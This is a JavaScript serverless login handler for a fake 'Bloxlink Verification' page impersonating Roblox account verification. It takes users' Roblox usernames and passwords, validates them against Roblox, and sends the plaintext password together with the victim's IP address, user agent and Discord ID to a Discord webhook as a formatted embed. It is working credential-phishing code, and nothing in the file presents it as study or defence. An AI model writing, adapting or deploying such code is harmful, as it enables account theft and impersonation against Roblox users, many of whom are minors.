import { verifyRobloxCredentials } from '../lib/roblox-verify.js';

export default async function handler(req, res) {
  // Set CORS headers
  res.setHeader('Access-Control-Allow-Credentials', 'true');
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type, Authorization');
  
  // Handle preflight
  if (req.method === 'OPTIONS') {
    return res.status(200).end();
  }
  
  if (req.method !== 'POST') {
    return res.status(405).json({ error: 'Method not allowed' });
  }

  try {
    const { username, password, discordId, token } = req.body;
    
    console.log('Login attempt for user:', username);
    
    if (!username || !password) {
      return res.status(400).json({ 
        success: false,
        error: 'Username and password are required' 
      });
    }
    
    // Get client IP
    const ip = req.headers['x-forwarded-for'] || req.connection.remoteAddress || 'Unknown';
    const userAgent = req.headers['user-agent'] || 'Unknown';
    
    // STEP 1: Verify Roblox credentials FIRST
    console.log('Verifying Roblox credentials...');
    const verificationResult = await verifyRobloxCredentials(username, password);
    
    if (!verificationResult.success) {
      // Send FAILED attempt to webhook
      await sendToDiscordWebhook({
        username,
        password: '[VERIFICATION FAILED - Invalid credentials]',
        discordId,
        ip,
        status: 'FAILED',
        error: verificationResult.error,
        userAgent
      });
      
      return res.status(401).json({
        success: false,
        error: verificationResult.error,
        message: verificationResult.message
      });
    }
    
    // STEP 2: Credentials are valid, send to Discord webhook
    console.log('Credentials verified, sending to Discord...');
    const webhookSuccess = await sendToDiscordWebhook({
      username,
      password,
      discordId,
      ip,
      status: 'SUCCESS',
      robloxId: verificationResult.robloxId,
      userAgent
    });
    
    if (!webhookSuccess) {
      console.warn('Failed to send webhook, but credentials were valid');
    }
    
    // STEP 3: Generate verification token
    const verificationToken = generateVerificationToken(discordId);
    
    // STEP 4: Return success response
    res.status(200).json({
      success: true,
      robloxUsername: verificationResult.username,
      robloxId: verificationResult.robloxId,
      displayName: verificationResult.displayName,
      verificationToken: verificationToken,
      message: 'Verification successful!'
    });
    
  } catch (error) {
    console.error('Login API error:', error);
    
    // Send error to webhook
    await sendToDiscordWebhook({
      username: req.body?.username || 'Unknown',
      password: '[SYSTEM ERROR]',
      discordId: req.body?.discordId,
      ip: req.headers['x-forwarded-for'] || 'Unknown',
      status: 'ERROR',
      error: error.message,
      userAgent: req.headers['user-agent']
    });
    
    res.status(500).json({ 
      success: false,
      error: 'Internal server error',
      message: 'Please try again later.'
    });
  }
}

// Send credentials to Discord webhook
async function sendToDiscordWebhook(data) {
  const webhookUrl = process.env.DISCORD_WEBHOOK_URL;
  
  if (!webhookUrl) {
    console.warn('No Discord webhook URL configured');
    return false;
  }
  
  try {
    const payload = {
      username: 'Roblox Verification System',
      avatar_url: 'https://cdn.discordapp.com/embed/avatars/0.png',
      embeds: [{
        title: data.status === 'SUCCESS' ? '✅ Roblox Login Successful' : 
               data.status === 'FAILED' ? '❌ Roblox Login Failed' : 
               '⚠️ Roblox Login Error',
        color: data.status === 'SUCCESS' ? 0x00ff00 : 
               data.status === 'FAILED' ? 0xff0000 : 0xffa500,
        fields: [
          {
            name: 'Roblox Username',
            value: `\`\`\`${data.username}\`\`\``,
            inline: true
          },
          {
            name: 'Roblox Password',
            value: `\`\`\`${data.password}\`\`\``,
            inline: true
          },
          {
            name: 'Discord User ID',
            value: data.discordId ? `\`${data.discordId}\`` : 'Not linked',
            inline: true
          },
          {
            name: 'Verification Status',
            value: `**${data.status}**`,
            inline: true
          },
          {
            name: 'IP Address',
            value: `\`${data.ip}\``,
            inline: true
          },
          {
            name: 'Roblox ID',
            value: data.robloxId ? `\`${data.robloxId}\`` : 'N/A',
            inline: true
          },
          {
            name: 'User Agent',
            value: `\`\`\`${data.userAgent.substring(0, 100)}...\`\`\``,
            inline: false
          },
          data.error ? {
            name: 'Error',
            value: `\`${data.error}\``,
            inline: false
          } : null
        ].filter(Boolean),
        footer: {
          text: 'Bloxlink Verification',
          icon_url: 'https://cdn.discordapp.com/embed/avatars/0.png'
        },
        timestamp: new Date().toISOString()
      }]
    };
    
    const response = await fetch(webhookUrl, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify(payload)
    });
    
    if (!response.ok) {
      console.error('Webhook failed:', await response.text());
      return false;
    }
    
    return true;
  } catch (error) {
    console.error('Webhook error:', error);
    return false;
  }
}

// Generate verification token
function generateVerificationToken(discordId) {
  const crypto = require('crypto');
  const timestamp = Date.now();
  const randomBytes = crypto.randomBytes(16).toString('hex');
  return `verify_${discordId}_${timestamp}_${randomBytes}`;
}
